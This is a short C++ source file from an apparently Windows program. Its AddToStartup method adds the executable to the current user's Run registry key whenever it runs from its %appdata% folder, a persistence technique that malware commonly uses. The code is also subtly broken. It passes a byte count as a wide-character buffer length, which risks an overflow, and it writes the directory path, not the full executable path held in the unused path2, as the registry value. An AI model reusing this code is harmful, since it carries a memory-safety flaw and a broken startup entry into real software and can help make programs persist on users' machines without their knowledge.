#include "SystemStartup.h"
#include "GlobalVariables.h"
#include "HelperMethods.h"
#include <Windows.h>



SystemStartup::SystemStartup()
{
}


SystemStartup::~SystemStartup()
{
}


void SystemStartup::AddToStartup() {
	wchar_t path[MAX_PATH];
	GetModuleFileNameW(NULL, path, sizeof(path));
	
	//RemovePathFilename returns same pointer modified
	//Check if current app path matches the default path, which is %appdata%
	if (!_wcsicmp(HelperMethods::RemovePathFilename(path), AppDefaultDirectory.c_str()) == 0) return; 
	
	wchar_t path2[MAX_PATH];
	GetModuleFileNameW(NULL, path2, sizeof(path2));

	//GetPathFilename doesn't need cleanup
	HelperMethods::SetRegistryValue(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", HelperMethods::GetPathFilename(path), path, KEY_SET_VALUE); 
}